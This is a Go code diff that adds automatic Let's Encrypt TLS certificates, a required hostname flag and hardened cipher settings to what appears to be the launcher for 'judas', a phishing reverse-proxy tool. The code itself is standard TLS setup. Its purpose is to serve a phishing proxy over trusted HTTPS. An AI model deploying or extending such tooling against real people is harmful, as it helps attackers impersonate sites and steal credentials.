@@ -11,9 +11,11 @@ import (
 	_ "net/http/pprof"
 	"net/url"
 	"os"
+	"path/filepath"
 	"time"
 
 	"github.com/joncooperworks/judas"
+	"golang.org/x/crypto/acme/autocert"
 )
 
 const (
@@ -30,6 +32,7 @@ var (
 	insecure            = flag.Bool("insecure", false, "Listen without TLS.")
 	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
 	proxyCACertFilename = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
+	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
 )
 
 func exitWithError(message string) {
@@ -45,6 +48,10 @@ func setupRequiredFlags() {
 
 	if *targetURL == "" {
 		exitWithError("--target is required.")
+	}
+
+	if !*insecure && *sslHostname == "" {
+		exitWithError("--ssl-hostname is required unless --insecure flag is enabled.")
 	}
 }
 
@@ -122,6 +129,7 @@ func main() {
 	if err != nil {
 		exitWithError(err.Error())
 	}
+
 	http.HandleFunc("/", phishingProxy.HandleRequests)
 
 	if *insecure {
@@ -131,6 +139,56 @@ func main() {
 		if err != nil {
 			log.Println(err)
 		}
+	} else {
+		certManager := autocert.Manager{
+			Prompt:     autocert.AcceptTOS,
+			HostPolicy: autocert.HostWhitelist(*sslHostname),
+			Cache:      autocert.DirCache(cacheDir(*sslHostname)),
+		}
+
+		tlsConfig := &tls.Config{
+			GetCertificate: certManager.GetCertificate,
+			MinVersion:     tls.VersionTLS12,
+			CipherSuites: []uint16{
+				// TLSv1.3
+				tls.TLS_AES_256_GCM_SHA384,
+				tls.TLS_CHACHA20_POLY1305_SHA256,
+				tls.TLS_AES_128_GCM_SHA256,
+
+				// TLSv1.2
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			},
+		}
+
+		server := &http.Server{
+			ReadTimeout:  5 * time.Second,
+			WriteTimeout: 10 * time.Second,
+			IdleTimeout:  120 * time.Second,
+			Addr:         ":https",
+			TLSConfig:    tlsConfig,
+		}
+
+		go http.ListenAndServe(":http", certManager.HTTPHandler(nil))
+
+		server.ListenAndServeTLS("", "")
 	}
 
+}
+
+func cacheDir(hostname string) (dir string) {
+	dir = filepath.Join(os.TempDir(), "cache-golang-autocert-"+hostname)
+	if _, err := os.Stat(dir); !os.IsNotExist(err) {
+		log.Println("Found cache dir:", dir)
+		return dir
+	}
+	if err := os.MkdirAll(dir, 0700); err == nil {
+		return dir
+	}
+
+	panic("couldnt create cert cache directory")
 }
